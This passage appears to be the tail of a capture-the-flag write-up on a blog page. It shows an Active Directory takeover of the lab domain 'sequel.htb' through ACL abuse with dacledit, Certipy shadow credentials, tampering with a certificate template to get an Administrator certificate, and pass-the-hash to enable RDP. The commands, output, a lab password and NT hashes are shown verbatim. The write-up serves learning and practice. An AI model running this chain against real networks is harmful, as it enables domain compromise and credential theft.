+</span></span><span style="display:flex;"><span>root@kali:~# dacledit.py -action <span style="color:#ed9d13">&#39;write&#39;</span> -rights <span style="color:#ed9d13">&#39;FullControl&#39;</span> -principal <span style="color:#ed9d13">&#39;ryan&#39;</span> -target <span style="color:#ed9d13">&#39;ca_svc&#39;</span> <span style="color:#ed9d13">&#39;sequel.htb&#39;</span>/<span style="color:#ed9d13">&#34;ryan&#34;</span>:<span style="color:#ed9d13">&#34;WqSZAF6CysDQbGb3&#34;</span>
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] DACL backed up to dacledit-20250206-112058.bak
+</span></span><span style="display:flex;"><span>[*] DACL modified successfully!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>//Generate our certificate 
+</span></span><span style="display:flex;"><span>root@kali:~# certipy shadow auto -u <span style="color:#ed9d13">&#39;ryan@sequel.htb&#39;</span> -p <span style="color:#ed9d13">&#34;WqSZAF6CysDQbGb3&#34;</span> -account <span style="color:#ed9d13">&#39;ca_svc&#39;</span> -dc-ip <span style="color:#ed9d13">&#39;10.10.11.51&#39;</span> -target dc01.sequel.htb -ns 10.10.11.51
+</span></span><span style="display:flex;"><span>Certipy v4.8.2 - by Oliver Lyak (ly4k)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Targeting user <span style="color:#ed9d13">&#39;ca_svc&#39;</span>
+</span></span><span style="display:flex;"><span>[*] Generating certificate
+</span></span><span style="display:flex;"><span>[*] Certificate generated
+</span></span><span style="display:flex;"><span>[*] Generating Key Credential
+</span></span><span style="display:flex;"><span>[*] Key Credential generated with DeviceID <span style="color:#ed9d13">&#39;81b327f2-913f-8ed0-8f02-0d7683e4d812&#39;</span>
+</span></span><span style="display:flex;"><span>[*] Adding Key Credential with device ID <span style="color:#ed9d13">&#39;81b327f2-913f-8ed0-8f02-0d7683e4d812&#39;</span> to the Key Credentials <span style="color:#6ab825;font-weight:bold">for</span> <span style="color:#ed9d13">&#39;ca_svc&#39;</span>
+</span></span><span style="display:flex;"><span>[*] Successfully added Key Credential with device ID <span style="color:#ed9d13">&#39;81b327f2-913f-8ed0-8f02-0d7683e4d812&#39;</span> to the Key Credentials <span style="color:#6ab825;font-weight:bold">for</span> <span style="color:#ed9d13">&#39;ca_svc&#39;</span>
+</span></span><span style="display:flex;"><span>[*] Authenticating as <span style="color:#ed9d13">&#39;ca_svc&#39;</span> with the certificate
+</span></span><span style="display:flex;"><span>[*] Using principal: ca_svc@sequel.htb
+</span></span><span style="display:flex;"><span>[*] Trying to get TGT...
+</span></span><span style="display:flex;"><span>[*] Got TGT
+</span></span><span style="display:flex;"><span>[*] Saved credential cache to <span style="color:#ed9d13">&#39;ca_svc.ccache&#39;</span>
+</span></span><span style="display:flex;"><span>[*] Trying to retrieve NT <span style="color:#24909d">hash</span> <span style="color:#6ab825;font-weight:bold">for</span> <span style="color:#ed9d13">&#39;ca_svc&#39;</span>
+</span></span><span style="display:flex;"><span>[*] Restoring the old Key Credentials <span style="color:#6ab825;font-weight:bold">for</span> <span style="color:#ed9d13">&#39;ca_svc&#39;</span>
+</span></span><span style="display:flex;"><span>[*] Successfully restored the old Key Credentials <span style="color:#6ab825;font-weight:bold">for</span> <span style="color:#ed9d13">&#39;ca_svc&#39;</span>
+</span></span><span style="display:flex;"><span>[*] NT <span style="color:#24909d">hash</span> <span style="color:#6ab825;font-weight:bold">for</span> <span style="color:#ed9d13">&#39;ca_svc&#39;</span>: 3b181b914e7a9d5508ea1e20bc2b7fce
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@kali:~# <span style="color:#40ffff">KRB5CCNAME</span>=<span style="color:#40ffff">$PWD</span>/ca_svc.ccache certipy template  -k -template DunderMifflinAuthentication  -target dc01.sequel.htb -dc-ip 10.10.11.51
+</span></span><span style="display:flex;"><span>Certipy v4.8.2 - by Oliver Lyak (ly4k)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Updating certificate template <span style="color:#ed9d13">&#39;DunderMifflinAuthentication&#39;</span>
+</span></span><span style="display:flex;"><span>[*] Successfully updated <span style="color:#ed9d13">&#39;DunderMifflinAuthentication&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@kali:~# certipy req -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target dc01.sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51
+</span></span><span style="display:flex;"><span>Certipy v4.8.2 - by Oliver Lyak (ly4k)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Requesting certificate via RPC
+</span></span><span style="display:flex;"><span>[*] Successfully requested certificate
+</span></span><span style="display:flex;"><span>[*] Request ID is <span style="color:#3677a9">9</span>
+</span></span><span style="display:flex;"><span>[*] Got certificate with multiple identifications
+</span></span><span style="display:flex;"><span>    UPN: <span style="color:#ed9d13">&#39;Administrator@sequel.htb&#39;</span>
+</span></span><span style="display:flex;"><span>    DNS Host Name: <span style="color:#ed9d13">&#39;10.10.11.51&#39;</span>
+</span></span><span style="display:flex;"><span>[*] Certificate has no object SID
+</span></span><span style="display:flex;"><span>[*] Saved certificate and private key to <span style="color:#ed9d13">&#39;administrator_10.pfx&#39;</span>
+</span></span></code></pre></div><p>Now we can authenticate on the server using the new certificate</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@kali:~# certipy auth -pfx administrator_10.pfx -dc-ip 10.10.11.51
+</span></span><span style="display:flex;"><span>root@kali:~# Certipy v4.8.2 - by Oliver Lyak (ly4k)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Found multiple identifications in certificate
+</span></span><span style="display:flex;"><span>[*] Please <span style="color:#6ab825;font-weight:bold">select</span> one:
+</span></span><span style="display:flex;"><span>    [0] UPN: <span style="color:#ed9d13">&#39;Administrator@sequel.htb&#39;</span>
+</span></span><span style="display:flex;"><span>    [1] DNS Host Name: <span style="color:#ed9d13">&#39;10.10.11.51&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Using principal: administrator@sequel.htb
+</span></span><span style="display:flex;"><span>[*] Trying to get TGT...
+</span></span><span style="display:flex;"><span>[*] Got TGT
+</span></span><span style="display:flex;"><span>[*] Saved credential cache to <span style="color:#ed9d13">&#39;administrator.ccache&#39;</span>
+</span></span><span style="display:flex;"><span>[*] Trying to retrieve NT <span style="color:#24909d">hash</span> <span style="color:#6ab825;font-weight:bold">for</span> <span style="color:#ed9d13">&#39;administrator&#39;</span>
+</span></span><span style="display:flex;"><span>[*] Got <span style="color:#24909d">hash</span> <span style="color:#6ab825;font-weight:bold">for</span> <span style="color:#ed9d13">&#39;administrator@sequel.htb&#39;</span>: aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
+</span></span></code></pre></div><p>now we have the admin hash let&rsquo;s use <a href="https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/pass-the-hash-attack/"  class="external-link" target="_blank" rel="noopener"><code>pass-the-hash</code></a> and
+enable <a href="https://en.wikipedia.org/wiki/Remote_Desktop_Protocol"  class="external-link" target="_blank" rel="noopener"><code>RDP</code></a> and connect to have full dominion.</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@kali:~# netexec smb 10.10.11.51 -u administrator -H <span style="color:#ed9d13">&#34;7a8d4e04986afa8ed4060f75e5a0b3ff&#34;</span> -M rdp -o <span style="color:#40ffff">ACTION</span>=<span style="color:#24909d">enable</span>                            
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             [*] Windows <span style="color:#3677a9">10</span> / Server <span style="color:#3677a9">2019</span> Build <span style="color:#3677a9">17763</span> x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             [+] sequel.htb<span style="color:#ed9d13">\a</span>dministrator:7a8d4e04986afa8ed4060f75e5a0b3ff (Pwn3d!)
+</span></span><span style="display:flex;"><span>RDP         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             [+] Enable RDP via WMI(ncacn_ip_tcp) successfully
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RDP         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             [+] RDP Port: <span style="color:#3677a9">3389</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>root@kali:~# xfreerdp3 /u:administrator /pth:<span style="color:#ed9d13">&#39;7a8d4e04986afa8ed4060f75e5a0b3ff&#39;</span> /d:sequel.htb /v:10.10.11.51
+</span></span></code></pre></div><p>and we now have full control over <code>ActiveDirectory</code>.</p>
+<p><img alt="map" src="https://pwnbuffer.github.io/images/mount/ADxpl/rdp.png"></p>
+<p><img alt="map" src="https://pwnbuffer.github.io/images/mount/ADxpl/users-in-rdp.png"></p>
+<p><img alt="map" src="https://pwnbuffer.github.io/images/mount/ADxpl/users-in-rdp.png"></p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css"
+    integrity="sha384-vKruj+a13U8yHIkAyGgK1J3ArTLzrFGBbBc0tDp4ad/EyewESeXE/Iv67Aj8gKZ0" crossorigin="anonymous">
+  
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.js"
+    integrity="sha384-PwRUT/YqbnEjkZO0zZxNqcxACrXe+j766U2amXcgMg5457rve2Y7I6ZJSm2A0mS4" crossorigin="anonymous"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/contrib/auto-render.min.js"
+    integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous"
+    onload="renderMathInElement(document.body,
+      {
+        delimiters: [
+          {left: '$$', right: '$$', display:true},
+          {left: '$', right: '$', display:false},
+          {left: '\\(', right: '\\)', display: false},
+          {left: '\\[', right: '\\]', display: true}
+        ]
+      }
+    );"></script>
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+    2025
+     pwnbuffer 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder (modified)</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="https://pwnbuffer.github.io/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+  
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
